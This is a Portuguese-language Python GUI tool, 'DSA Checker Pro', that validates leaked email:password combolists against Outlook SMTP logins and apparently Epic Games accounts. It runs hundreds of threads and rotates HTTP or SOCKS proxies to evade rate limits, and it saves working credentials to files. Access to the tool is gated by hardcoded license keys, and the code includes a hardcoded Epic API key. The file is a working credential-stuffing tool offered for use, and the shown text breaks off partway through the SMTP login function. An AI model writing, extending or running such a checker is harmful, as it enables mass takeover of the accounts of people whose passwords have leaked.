import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import smtplib
import socket
import ssl
import os
import time
import json
import logging
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import math
import random
from typing import List, Tuple, Optional, Dict
import requests
import re
import base64
import uuid

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dsa_checker.log'),
        logging.StreamHandler()
    ]
)

class DSACheckerApp:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DSA Checker Pro - Multi-System Validation")
        self.root.geometry("900x750")
        self.root.resizable(False, False)
        self.root.configure(bg='#0a0e13')
        
        # Variáveis para animação
        self.particles = []
        self.animation_running = True
        
        # Contador de tentativas de login
        self.login_attempts = 0
        self.max_login_attempts = 3
        self.blocked_until = None
        
        # Chaves válidas
        self.valid_keys = [
            "XANDI",
            "A1B2C3D4E5F6G7H8I9J0K1L2M",
            "X9Y8Z7W6V5U4T3S2R1Q0P9O8N",
            "M3N4B5V6C7X8Z9A1S2D3F4G5H",
            "Q2W3E4R5T6Y7U8I9O0P1A2S3D",
            "Z1X2C3V4B5N6M7L8K9J0H1G2F"
        ]
        
        # Variáveis para os testers
        self.smtp_tester = SMTPTester()
        self.epic_tester = EpicGamesTester()
        self.current_tester = None
        self.running = False
        
        self.create_particles()
        self.show_login_screen()
        self.animate_background()
        
    def create_particles(self):
        """Cria partículas para animação de fundo"""
        for _ in range(40):
            particle = {
                'x': random.randint(0, 900),
                'y': random.randint(0, 750),
                'vx': random.uniform(-0.7, 0.7),
                'vy': random.uniform(-0.7, 0.7),
                'size': random.randint(1, 4),
                'opacity': random.uniform(0.05, 0.2)
            }
            self.particles.append(particle)
    
    def animate_background(self):
        """Anima as partículas de fundo"""
        if not self.animation_running:
            return
            
        if hasattr(self, 'bg_canvas'):
            self.bg_canvas.delete("particle")
        
        for particle in self.particles:
            particle['x'] += particle['vx']
            particle['y'] += particle['vy']
            
            if particle['x'] <= 0 or particle['x'] >= 900:
                particle['vx'] *= -1
            if particle['y'] <= 0 or particle['y'] >= 750:
                particle['vy'] *= -1
            
            particle['x'] = max(0, min(900, particle['x']))
            particle['y'] = max(0, min(750, particle['y']))
            
            if hasattr(self, 'bg_canvas'):
                color = f"#{int(52 + particle['opacity'] * 100):02x}{int(152 + particle['opacity'] * 100):02x}{int(219 + particle['opacity'] * 100):02x}"
                self.bg_canvas.create_oval(
                    particle['x'] - particle['size'],
                    particle['y'] - particle['size'],
                    particle['x'] + particle['size'],
                    particle['y'] + particle['size'],
                    fill=color,
                    outline="",
                    tags="particle"
                )
        
        if hasattr(self, 'bg_canvas'):
            for i, p1 in enumerate(self.particles):
                for j, p2 in enumerate(self.particles[i+1:], i+1):
                    distance = math.sqrt((p1['x'] - p2['x'])**2 + (p1['y'] - p2['y'])**2)
                    if distance < 120:
                        opacity = max(0, 1 - distance/120) * 0.08
                        color = f"#{int(52 + opacity * 200):02x}{int(152 + opacity * 200):02x}{int(219 + opacity * 200):02x}"
                        self.bg_canvas.create_line(
                            p1['x'], p1['y'], p2['x'], p2['y'],
                            fill=color,
                            width=1,
                            tags="particle"
                        )
        
        self.root.after(40, self.animate_background)
    
    def show_login_screen(self):
        """Mostra a tela de login"""
        self.clear_screen()
        
        # Canvas de fundo para animação
        self.bg_canvas = tk.Canvas(self.root, width=900, height=750, bg='#0a0e13', highlightthickness=0)
        self.bg_canvas.place(x=0, y=0)
        
        # Frame principal com transparência
        main_frame = tk.Frame(self.root, bg='#1e2328', relief='raised', bd=2)
        main_frame.place(x=200, y=100, width=500, height=500)
        
        # Efeito de sombra
        shadow_frame = tk.Frame(self.root, bg='#000000')
        shadow_frame.place(x=203, y=103, width=500, height=500)
        main_frame.lift()
        
        # Header
        header_frame = tk.Frame(main_frame, bg='#2c5aa0', height=80)
        header_frame.pack(fill='x')
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(
            header_frame, 
            text="DSA CHECKER PRO", 
            font=('Segoe UI', 20, 'bold'),
            fg='#ffffff',
            bg='#2c5aa0'
        )
        title_label.pack(pady=15)
        
        subtitle_label = tk.Label(
            header_frame, 
            text="Multi-System Validation", 
            font=('Segoe UI', 11),
            fg='#e8f4fd',
            bg='#2c5aa0'
        )
        subtitle_label.pack()
        
        # Corpo do formulário
        form_frame = tk.Frame(main_frame, bg='#1e2328', padx=40, pady=30)
        form_frame.pack(fill='both', expand=True)
        
        instruction_label = tk.Label(
            form_frame, 
            text="Insira seu token de validação (25 caracteres)", 
            font=('Segoe UI', 12),
            fg='#c9d1d9',
            bg='#1e2328'
        )
        instruction_label.pack(pady=(0, 20))
        
        key_label = tk.Label(
            form_frame, 
            text="🔑 Token de Acesso:", 
            font=('Segoe UI', 14, 'bold'),
            fg='#58a6ff',
            bg='#1e2328'
        )
        key_label.pack(anchor='w', pady=(0, 8))
        
        entry_frame = tk.Frame(form_frame, bg='#1e2328')
        entry_frame.pack(fill='x', pady=(0, 8))
        
        self.key_entry = tk.Entry(
            entry_frame, 
            font=('Consolas', 14),
            width=35,
            justify='center',
            bg='#0d1117',
            fg='#c9d1d9',
            insertbackground='#58a6ff',
            relief='flat',
            bd=0,
            highlightthickness=2,
            highlightcolor='#58a6ff',
            highlightbackground='#30363d'
        )
        self.key_entry.pack(pady=5, ipady=12)
        self.key_entry.bind('<KeyRelease>', self.format_key)
        self.key_entry.bind('<Return>', lambda e: self.validate_key())
        
        format_label = tk.Label(
            form_frame,
            text="Formato: XXXXX-XXXXX-XXXXX-XXXXX-XXXXX",
            font=('Segoe UI', 10),
            fg='#7d8590',
            bg='#1e2328'
        )
        format_label.pack(pady=(0, 15))
        
        button_frame = tk.Frame(form_frame, bg='#1e2328')
        button_frame.pack(fill='x', pady=(10, 0))
        
        self.validate_button = tk.Button(
            button_frame,
            text="VALIDA",
            font=('Segoe UI', 12, 'bold'),
            bg='#238636',
            fg='white',
            relief='flat',
            bd=0,
            padx=25,
            pady=12,
            command=self.validate_key,
            cursor='hand2',
            activebackground='#2ea043'
        )
        self.validate_button.pack(side='left', padx=(0, 10))
        
        clear_button = tk.Button(
            button_frame,
            text="🗑️ LIMPAR",
            font=('Segoe UI', 12, 'bold'),
            bg='#da3633',
            fg='white',
            relief='flat',
            bd=0,
            padx=25,
            pady=12,
            command=self.clear_key,
            cursor='hand2',
            activebackground='#f85149'
        )
        clear_button.pack(side='left', padx=(0, 10))
        
        status_frame = tk.Frame(form_frame, bg='#1e2328')
        status_frame.pack(fill='x', pady=(15, 0))
        
        self.status_label = tk.Label(
            status_frame,
            text="",
            font=('Segoe UI', 11),
            fg='#f85149',
            bg='#1e2328',
            wraplength=400
        )
        self.status_label.pack()
        
        self.attempts_label = tk.Label(
            status_frame,
            text=f"Tentativas restantes: {self.max_login_attempts}",
            font=('Segoe UI', 10),
            fg='#7d8590',
            bg='#1e2328'
        )
        self.attempts_label.pack(pady=(5, 0))
    
    def format_key(self, event):
        current_text = self.key_entry.get().replace('-', '').upper()
        
        if len(current_text) > 25:
            current_text = current_text[:25]
        
        formatted = ''
        for i, char in enumerate(current_text):
            if i > 0 and i % 5 == 0:
                formatted += '-'
            formatted += char
        
        cursor_pos = self.key_entry.index(tk.INSERT)
        self.key_entry.delete(0, tk.END)
        self.key_entry.insert(0, formatted)
        
        if cursor_pos < len(formatted):
            self.key_entry.icursor(cursor_pos)
    
    def clear_key(self):
        self.key_entry.delete(0, tk.END)
        self.status_label.config(text="")
    
    def is_blocked(self):
        if self.blocked_until and time.time() < self.blocked_until:
            remaining = int(self.blocked_until - time.time()) + 1
            return True, remaining
        elif self.blocked_until and time.time() >= self.blocked_until:
            self.reset_attempts()
            return False, 0
        return False, 0
    
    def validate_key(self):
        blocked, remaining = self.is_blocked()
        if blocked:
            self.status_label.config(
                text=f"🚫 Login bloqueado! Aguarde {remaining} segundos...",
                fg='#f85149'
            )
            self.validate_button.config(state='disabled')
            return
            
        key = self.key_entry.get().replace('-', '').upper()
        
        if len(key) != 25:
            self.status_label.config(
                text="⚠️ O token deve ter exatamente 25 caracteres!",
                fg='#d29922'
            )
            return
            
        if key in self.valid_keys:
            self.email_validation_success()
        else:
            self.validation_failed()
    
    def email_validation_success(self):
        self.status_label.config(
            text="✅ Token válido! Acesso liberado.",
            fg='#238636'
        )
        self.root.after(1000, self.show_main_dashboard)
    
    def show_main_dashboard(self):
        self.clear_screen()
        
        self.bg_canvas = tk.Canvas(self.root, width=900, height=750, bg='#0a0e13', highlightthickness=0)
        self.bg_canvas.place(x=0, y=0)
        
        main_frame = tk.Frame(self.root, bg='#1e2328', relief='raised', bd=2)
        main_frame.place(x=50, y=25, width=800, height=700)
        
        shadow_frame = tk.Frame(self.root, bg='#000000')
        shadow_frame.place(x=53, y=28, width=800, height=700)
        main_frame.lift()
        
        header_frame = tk.Frame(main_frame, bg='#2c5aa0', height=80)
        header_frame.pack(fill='x')
        header_frame.pack_propagate(False)
        
        title_label = tk.Label(
            header_frame, 
            text="🔐 DSA MULTI-CHECKER", 
            font=('Segoe UI', 20, 'bold'),
            fg='#ffffff',
            bg='#2c5aa0'
        )
        title_label.pack(pady=15)
        
        subtitle_label = tk.Label(
            header_frame, 
            text="SMTP & Epic Games Validation System", 
            font=('Segoe UI', 11),
            fg='#e8f4fd',
            bg='#2c5aa0'
        )
        subtitle_label.pack()
        
        body_frame = tk.Frame(main_frame, bg='#1e2328', padx=20, pady=20)
        body_frame.pack(fill='both', expand=True)
        
        # Frame de seleção de modo
        mode_frame = tk.LabelFrame(body_frame, text="Modo de Verificação", bg='#1e2328', fg='#58a6ff', 
                                 font=('Segoe UI', 12, 'bold'), padx=10, pady=10)
        mode_frame.pack(fill='x', pady=5)
        
        self.mode_var = tk.StringVar(value="smtp")
        
        tk.Radiobutton(
            mode_frame,
            text="SMTP Checker",
            variable=self.mode_var,
            value="smtp",
            bg='#1e2328',
            fg='#c9d1d9',
            selectcolor='#1e2328',
            activebackground='#1e2328',
            activeforeground='#58a6ff',
            command=self.update_mode,
            font=('Segoe UI', 10)
        ).pack(side='left', padx=10)
        
        tk.Radiobutton(
            mode_frame,
            text="Epic Games Checker",
            variable=self.mode_var,
            value="epic",
            bg='#1e2328',
            fg='#c9d1d9',
            selectcolor='#1e2328',
            activebackground='#1e2328',
            activeforeground='#58a6ff',
            command=self.update_mode,
            font=('Segoe UI', 10)
        ).pack(side='left', padx=10)
        
        # Frame de configuração avançada
        config_frame = tk.LabelFrame(body_frame, text="Configurações Avançadas", bg='#1e2328', fg='#58a6ff', 
                                   font=('Segoe UI', 12, 'bold'), padx=10, pady=10)
        config_frame.pack(fill='x', pady=5)
        
        # Linha 1 - Proxies e Combolist
        row1_frame = tk.Frame(config_frame, bg='#1e2328')
        row1_frame.pack(fill='x', pady=5)
        
        tk.Button(
            row1_frame,
            text="📋 Carregar Proxies",
            font=('Segoe UI', 11),
            bg='#1f6feb',
            fg='white',
            relief='flat',
            bd=0,
            padx=15,
            pady=8,
            command=self.load_proxies,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        self.proxy_label = tk.Label(
            row1_frame,
            text="Nenhum arquivo carregado",
            font=('Segoe UI', 10),
            fg='#7d8590',
            bg='#1e2328'
        )
        self.proxy_label.pack(side='left', padx=10)
        
        tk.Button(
            row1_frame,
            text="📋 Carregar Combolist",
            font=('Segoe UI', 11),
            bg='#1f6feb',
            fg='white',
            relief='flat',
            bd=0,
            padx=15,
            pady=8,
            command=self.load_combolist,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        self.combo_label = tk.Label(
            row1_frame,
            text="Nenhum arquivo carregado",
            font=('Segoe UI', 10),
            fg='#7d8590',
            bg='#1e2328'
        )
        self.combo_label.pack(side='left', padx=10)
        
        # Linha 2 - Configurações específicas do modo
        self.settings_frame = tk.Frame(config_frame, bg='#1e2328')
        self.settings_frame.pack(fill='x', pady=5)
        
        # Configurações padrão (serão atualizadas pelo update_mode)
        self.smtp_settings()
        
        # Linha 3 - Configurações avançadas
        row3_frame = tk.Frame(config_frame, bg='#1e2328')
        row3_frame.pack(fill='x', pady=5)
        
        tk.Label(
            row3_frame,
            text="Threads:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.threads_var = tk.StringVar(value="100")
        threads_options = [str(x) for x in range(50, 501, 50)]
        self.threads_menu = ttk.Combobox(
            row3_frame,
            textvariable=self.threads_var,
            values=threads_options,
            state='readonly',
            width=8,
            font=('Segoe UI', 10)
        )
        self.threads_menu.pack(side='left', padx=5)
        
        tk.Label(
            row3_frame,
            text="Tipo Proxy:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.proxy_type_var = tk.StringVar(value="HTTP")
        self.proxy_type_menu = ttk.Combobox(
            row3_frame,
            textvariable=self.proxy_type_var,
            values=["HTTP", "SOCKS4", "SOCKS5"],
            state='readonly',
            width=8,
            font=('Segoe UI', 10)
        )
        self.proxy_type_menu.pack(side='left', padx=5)
        
        # Botões de limpeza
        row4_frame = tk.Frame(config_frame, bg='#1e2328')
        row4_frame.pack(fill='x', pady=5)
        
        tk.Button(
            row4_frame,
            text="🧹 Limpar Inválidas",
            font=('Segoe UI', 10),
            bg='#da3633',
            fg='white',
            relief='flat',
            bd=0,
            padx=10,
            pady=5,
            command=self.clear_invalid,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        tk.Button(
            row4_frame,
            text="🧹 Limpar Erros",
            font=('Segoe UI', 10),
            bg='#da3633',
            fg='white',
            relief='flat',
            bd=0,
            padx=10,
            pady=5,
            command=self.clear_errors,
            cursor='hand2'
        ).pack(side='left', padx=5)
        
        # Frame de progresso
        progress_frame = tk.LabelFrame(body_frame, text="Progresso", bg='#1e2328', fg='#58a6ff', 
                                     font=('Segoe UI', 12, 'bold'), padx=10, pady=10)
        progress_frame.pack(fill='x', pady=5)
        
        self.progress_label = tk.Label(
            progress_frame,
            text="Pronto para iniciar",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        )
        self.progress_label.pack(anchor='w', pady=5)
        
        self.progress = ttk.Progressbar(
            progress_frame,
            orient='horizontal',
            mode='determinate',
            length=700
        )
        self.progress.pack(fill='x', pady=5)
        
        # Frame de botões de ação
        action_frame = tk.Frame(body_frame, bg='#1e2328')
        action_frame.pack(fill='x', pady=5)
        
        self.start_button = tk.Button(
            action_frame,
            text="🚀 Iniciar Verificação",
            font=('Segoe UI', 12, 'bold'),
            bg='#238636',
            fg='white',
            relief='flat',
            bd=0,
            padx=25,
            pady=10,
            command=self.start_check,
            cursor='hand2'
        )
        self.start_button.pack(side='left', padx=5)
        
        self.stop_button = tk.Button(
            action_frame,
            text="🛑 Parar",
            font=('Segoe UI', 12, 'bold'),
            bg='#da3633',
            fg='white',
            relief='flat',
            bd=0,
            padx=25,
            pady=10,
            command=self.stop_check,
            state='disabled',
            cursor='hand2'
        )
        self.stop_button.pack(side='left', padx=5)
        
        # Frame de resultados
        result_frame = tk.LabelFrame(body_frame, text="Resultados", bg='#1e2328', fg='#58a6ff', 
                                   font=('Segoe UI', 12, 'bold'), padx=10, pady=10)
        result_frame.pack(fill='both', expand=True, pady=5)
        
        self.result_text = scrolledtext.ScrolledText(
            result_frame,
            font=('Consolas', 10),
            bg='#0d1117',
            fg='#c9d1d9',
            insertbackground='#58a6ff',
            wrap='word',
            padx=10,
            pady=10
        )
        self.result_text.pack(fill='both', expand=True)
        self.result_text.config(state='disabled')
        
        # Botão de logout
        logout_button = tk.Button(
            body_frame,
            text="🔒 Sair",
            font=('Segoe UI', 10),
            bg='#30363d',
            fg='white',
            relief='flat',
            bd=0,
            padx=15,
            pady=5,
            command=self.logout,
            cursor='hand2'
        )
        logout_button.pack(side='right', pady=10)
        
        # Inicializa o modo atual
        self.update_mode()
    
    def smtp_settings(self):
        """Configurações específicas para SMTP"""
        for widget in self.settings_frame.winfo_children():
            widget.destroy()
        
        tk.Label(
            self.settings_frame,
            text="Servidor:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.smtp_server = tk.Entry(
            self.settings_frame,
            font=('Segoe UI', 10),
            bg='#0d1117',
            fg='#c9d1d9',
            insertbackground='#58a6ff',
            relief='flat',
            width=20
        )
        self.smtp_server.pack(side='left', padx=5)
        self.smtp_server.insert(0, "smtp-mail.outlook.com")
        
        tk.Label(
            self.settings_frame,
            text="Porta:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.smtp_port = tk.Entry(
            self.settings_frame,
            font=('Segoe UI', 10),
            bg='#0d1117',
            fg='#c9d1d9',
            insertbackground='#58a6ff',
            relief='flat',
            width=8
        )
        self.smtp_port.pack(side='left', padx=5)
        self.smtp_port.insert(0, "587")
    
    def epic_settings(self):
        """Configurações específicas para Epic Games"""
        for widget in self.settings_frame.winfo_children():
            widget.destroy()
        
        tk.Label(
            self.settings_frame,
            text="API Key:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.epic_api_key = tk.Entry(
            self.settings_frame,
            font=('Segoe UI', 10),
            bg='#0d1117',
            fg='#c9d1d9',
            insertbackground='#58a6ff',
            relief='flat',
            width=30
        )
        self.epic_api_key.pack(side='left', padx=5)
        self.epic_api_key.insert(0, "875a3b8d6b414c6b9a00cdfaac243d5a")  # Chave API padrão
        
        tk.Label(
            self.settings_frame,
            text="Verificar:",
            font=('Segoe UI', 10),
            fg='#c9d1d9',
            bg='#1e2328'
        ).pack(side='left', padx=5)
        
        self.epic_check_var = tk.StringVar(value="both")
        
        tk.Radiobutton(
            self.settings_frame,
            text="Conta",
            variable=self.epic_check_var,
            value="account",
            bg='#1e2328',
            fg='#c9d1d9',
            selectcolor='#1e2328',
            activebackground='#1e2328',
            activeforeground='#58a6ff',
            font=('Segoe UI', 9)
        ).pack(side='left', padx=2)
        
        tk.Radiobutton(
            self.settings_frame,
            text="Jogos",
            variable=self.epic_check_var,
            value="games",
            bg='#1e2328',
            fg='#c9d1d9',
            selectcolor='#1e2328',
            activebackground='#1e2328',
            activeforeground='#58a6ff',
            font=('Segoe UI', 9)
        ).pack(side='left', padx=2)
        
        tk.Radiobutton(
            self.settings_frame,
            text="Ambos",
            variable=self.epic_check_var,
            value="both",
            bg='#1e2328',
            fg='#c9d1d9',
            selectcolor='#1e2328',
            activebackground='#1e2328',
            activeforeground='#58a6ff',
            font=('Segoe UI', 9)
        ).pack(side='left', padx=2)
    
    def update_mode(self):
        """Atualiza a interface com base no modo selecionado"""
        mode = self.mode_var.get()
        if mode == "smtp":
            self.current_tester = self.smtp_tester
            self.smtp_settings()
        elif mode == "epic":
            self.current_tester = self.epic_tester
            self.epic_settings()
    
    def clear_invalid(self):
        """Limpa as credenciais inválidas"""
        if self.current_tester:
            self.current_tester.invalid_creds = []
            self.update_result("Credenciais inválidas limpas!")
    
    def clear_errors(self):
        """Limpa os erros"""
        if self.current_tester:
            self.current_tester.error_creds = []
            self.update_result("Erros limpos!")
    
    def clear_screen(self):
        for widget in self.root.winfo_children():
            widget.destroy()
    
    def validation_failed(self):
        self.login_attempts += 1
        remaining_attempts = self.max_login_attempts - self.login_attempts
        
        if remaining_attempts > 0:
            self.status_label.config(
                text=f"❌ Token inválido! {remaining_attempts} tentativas restantes.",
                fg='#f85149'
            )
            self.attempts_label.config(
                text=f"Tentativas restantes: {remaining_attempts}"
            )
        else:
            self.blocked_until = time.time() + 30
            self.validate_button.config(state='disabled')
            self.status_label.config(
                text="🚫 Muitas tentativas inválidas! Login bloqueado por 30 segundos.",
                fg='#f85149'
            )
            self.attempts_label.config(
                text="Login bloqueado!"
            )
            self.update_blocked_timer()
    
    def update_blocked_timer(self):
        blocked, remaining = self.is_blocked()
        if blocked:
            self.status_label.config(
                text=f"🚫 Login bloqueado! Aguarde {remaining} segundos...",
                fg='#f85149'
            )
            self.attempts_label.config(
                text=f"Desbloqueio em: {remaining}s"
            )
            self.root.after(1000, self.update_blocked_timer)
        else:
            self.reset_attempts()
    
    def reset_attempts(self):
        self.login_attempts = 0
        self.blocked_until = None
        self.validate_button.config(state='normal')
        self.status_label.config(
            text="✅ Login desbloqueado! Você pode tentar novamente.",
            fg='#238636'
        )
        self.attempts_label.config(
            text=f"Tentativas restantes: {self.max_login_attempts}"
        )
    
    def logout(self):
        if self.running:
            if messagebox.askokcancel("Sair", "A verificação está em andamento. Deseja realmente sair?"):
                self.running = False
                self.show_login_screen()
        else:
            self.show_login_screen()
    
    def load_proxies(self):
        file_path = filedialog.askopenfilename(
            title="Selecione o arquivo de proxies",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.current_tester.config['proxy_file'] = file_path
            self.proxy_label.config(text=f"Proxies: {os.path.basename(file_path)}")
            self.current_tester.proxies = self.current_tester.load_proxies()
            self.update_result(f"Proxies carregados: {len(self.current_tester.proxies)}")
    
    def load_combolist(self):
        file_path = filedialog.askopenfilename(
            title="Selecione o arquivo de combolist",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if file_path:
            self.current_tester.config['input_file'] = file_path
            self.combo_label.config(text=f"Combolist: {os.path.basename(file_path)}")
            
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    line_count = sum(1 for line in f if line.strip())
                self.update_result(f"Combolist carregada: {file_path} ({line_count} credenciais)")
            except Exception as e:
                self.update_result(f"Erro ao ler combolist: {str(e)}")
    
    def start_check(self):
        if not hasattr(self.current_tester, 'proxies') or not self.current_tester.proxies:
            if not messagebox.askyesno("Aviso", "Nenhum proxy carregado. Deseja continuar sem proxies?"):
                return
        
        if not os.path.exists(self.current_tester.config['input_file']):
            messagebox.showerror("Erro", "Nenhum arquivo de combolist carregado!")
            return
        
        # Atualiza configurações
        if self.mode_var.get() == "smtp":
            self.current_tester.config['smtp_server'] = self.smtp_server.get()
            self.current_tester.config['smtp_port'] = int(self.smtp_port.get())
        elif self.mode_var.get() == "epic":
            self.current_tester.config['api_key'] = self.epic_api_key.get()
            self.current_tester.config['check_type'] = self.epic_check_var.get()
        
        self.current_tester.config['max_workers'] = int(self.threads_var.get())
        self.current_tester.config['proxy_type'] = self.proxy_type_var.get()
        
        self.running = True
        self.start_button.config(state='disabled')
        self.stop_button.config(state='normal')
        
        # Limpa resultados anteriores
        self.current_tester.valid_creds = []
        self.current_tester.invalid_creds = []
        self.current_tester.error_creds = []
        self.current_tester.stats = {
            'total': 0,
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'proxy_errors': 0,
            'start_time': None,
            'end_time': None
        }
        
        # Limpa a área de resultados
        self.result_text.config(state='normal')
        self.result_text.delete(1.0, tk.END)
        self.result_text.config(state='disabled')
        
        # Inicia a verificação em uma thread separada
        import threading
        self.check_thread = threading.Thread(target=self.run_check, daemon=True)
        self.check_thread.start()
    
    def run_check(self):
        try:
            self.current_tester.process_credentials(self.update_progress)
            self.update_result("\nVerificação concluída com sucesso!")
        except Exception as e:
            self.update_result(f"\nErro durante a verificação: {str(e)}")
        finally:
            self.running = False
            self.root.after(0, self.on_check_finished)
    
    def update_progress(self, current, total, email, status):
        self.root.after(0, lambda: self._update_progress(current, total, email, status))
    
    def _update_progress(self, current, total, email, status):
        if total > 0:
            progress = (current / total) * 100
            self.progress['value'] = progress
        self.progress_label.config(text=f"Verificando {current}/{total}: {email} - {status}")
        self.update_result(f"{email}: {status}")
    
    def stop_check(self):
        self.running = False
        self.update_result("\nVerificação interrompida pelo usuário")
    
    def on_check_finished(self):
        self.start_button.config(state='normal')
        self.stop_button.config(state='disabled')
        
        stats = self.current_tester.stats
        self.update_result(f"\n╔═════════════════════════════════════════╗")
        self.update_result(f"║          RESUMO DA VERIFICAÇÃO            ║")
        self.update_result(f"╠═══════════════════════════════════════════╣")
        self.update_result(f"║ Credenciais testadas: {stats['total']:>8} ║")
        self.update_result(f"║ Válidas:           {stats['valid']:>8}    ║")
        self.update_result(f"║ Inválidas:         {stats['invalid']:>8}  ║")
        self.update_result(f"║ Erros:             {stats['errors']:>8}   ║")
        self.update_result(f"╚═══════════════════════════════════════════╝")
    
    def update_result(self, message):
        self.root.after(0, lambda: self._update_result(message))
    
    def _update_result(self, message):
        self.result_text.config(state='normal')
        self.result_text.insert(tk.END, message + "\n")
        self.result_text.see(tk.END)
        self.result_text.config(state='disabled')
    
    def run(self):
        try:
            self.root.mainloop()
        finally:
            self.animation_running = False

class SMTPTester:
    def __init__(self):
        self.config = self.load_config()
        self.proxies = self.load_proxies()
        self.current_proxy = None
        self.proxy_index = 0
        self.stats = {
            'total': 0,
            'valid': 0,
            'invalid': 0,
            'errors': 0,
            'proxy_errors': 0,
            'start_time': None,
            'end_time': None
        }
        self.valid_creds = []
        self.invalid_creds = []
        self.error_creds = []

    def load_config(self) -> Dict:
        default_config = {
            "smtp_server": "smtp-mail.outlook.com",
            "smtp_port": 587,
            "timeout": 10,
            "max_workers": 100,
            "use_ssl": False,
            "use_tls": True,
            "input_file": "credenciais.txt",
            "valid_output": "validas.txt",
            "invalid_output": "invalidas.txt",
            "error_output": "erros.txt",
            "report_file": "relatorio.json",
            "proxy_file": "proxies.txt",
            "proxy_type": "HTTP",
            "max_retries": 3,
            "proxy_timeout": 30
        }

        try:
            with open('config.json', 'r') as f:
                config = json.load(f)
                return {**default_config, **config}
        except FileNotFoundError:
            return default_config
        except json.JSONDecodeError:
            logging.warning("Arquivo config.json inválido. Usando configurações padrão.")
            return default_config

    def load_proxies(self) -> List[str]:
        try:
            with open(self.config['proxy_file'], 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            logging.warning("Arquivo de proxies não encontrado. Usando conexão direta.")
            return []
        except Exception as e:
            logging.error(f"Erro ao carregar proxies: {str(e)}")
            return []

    def get_next_proxy(self) -> Optional[Dict]:
        if not self.proxies:
            return None

        if self.proxy_index >= len(self.proxies):
            self.proxy_index = 0

        proxy = self.proxies[self.proxy_index]
        self.proxy_index += 1
        self.current_proxy = proxy

        proxy_type = self.config.get('proxy_type', 'HTTP').lower()
        
        if proxy_type == 'socks4':
            return {
                'http': f'socks4://{proxy}',
                'https': f'socks4://{proxy}'
            }
        elif proxy_type == 'socks5':
            return {
                'http': f'socks5://{proxy}',
                'https': f'socks5://{proxy}'
            }
        else:  # HTTP
            return {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }

    def validate_credential_format(self, line: str) -> Optional[Tuple[str, str]]:
        line = line.strip()
        if not line or line.startswith('#'):
            return None

        if line.count(':') != 1:
            logging.warning(f"Formato inválido: {line}")
            return None

        email, password = line.split(':', 1)
        email = email.strip()
        password = password.strip()

        if not email or not password:
            return None

        if '@' not in email or '.' not in email.split('@')[-1]:
            logging.warning(f"Email inválido: {email}")
            return None

        return (email, password)

    def test_smtp_login(self, email: str, password: str, progress_callback=None) -> Dict:
        result = {
            'email': email,
            'password': password,
            'valid': False,
            'error': None,
            'server': self.config['smtp_server'],
            'proxy': self.current_proxy,
            'timestamp': datetime.now().isoformat()
        }

        retries = 0
        max_retries = self.config['max_retries']

        while retries < max_retries:
            proxy_dict = self.get_next_proxy() if self.proxies else None

            try:
                if proxy_dict and self.current_proxy:
                    proxy_parts = self.current_proxy.split(':')
                    if len(proxy_parts) == 2:
                        proxy_host, proxy_port = proxy_parts
                    else:
                        proxy_host, proxy_port = proxy_parts[0], '8080'

                    if progress_callback:
                        progress_callback(retries, max_retries, email, f"Tentando proxy {self.current_proxy}")

                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.config['timeout'])
                    sock.connect((proxy_host, int(proxy_port)))

                    with smtplib.SMTP(
                        host=self.config['smtp_server'],
                        port=self.config['smtp_port'],
                        timeout=self.config['timeout'],
                        source_address=None
                    ) as server:
                        server.sock = sock
                        server.set_debuglevel(0)

                        server.ehlo()
                        
                        if self.config['use_tls']:
                            server.starttls(context=ssl.create_default_context())
                            server.ehlo()

                        try:
                            server.login(email, password)
                            result['valid'] = True
                            logging.info(f"Login válido: {email} via proxy {self.current_proxy}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, "Válido")
                            break
                        except smtplib.SMTPAuthenticationError:
                            result['error'] = "Credenciais inválidas"
                            logging.warning(f"Credenciais inválidas: {email}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, "Inválido")
                            break
                        except smtplib.SMTPException as e:
                            result['error'] = f"Erro SMTP: {str(e)}"
                            logging.error(f"Erro SMTP para {email}: {str(e)}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                            retries += 1
                        except Exception as e:
                            result['error'] = f"Erro inesperado: {str(e)}"
                            logging.error(f"Erro inesperado para {email}: {str(e)}")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, f"Erro: {str(e)}")
                            retries += 1
                else:
                    if progress_callback:
                        progress_callback(retries, max_retries, email, "Tentando conexão direta")

                    with smtplib.SMTP(
                        host=self.config['smtp_server'],
                        port=self.config['smtp_port'],
                        timeout=self.config['timeout']
                    ) as server:
                        server.set_debuglevel(0)

                        server.ehlo()
                        
                        if self.config['use_tls']:
                            server.starttls(context=ssl.create_default_context())
                            server.ehlo()

                        try:
                            server.login(email, password)
                            result['valid'] = True
                            logging.info(f"Login válido: {email} (sem proxy)")
                            if progress_callback:
                                progress_callback(retries, max_retries, email, "Válido")
                            break
                        except smtplib.SMTPAuthenticationError:
                            result['error'] = "Credenciais inválidas"
                            logging.warning(f"Credenciais inválidas: {email}")
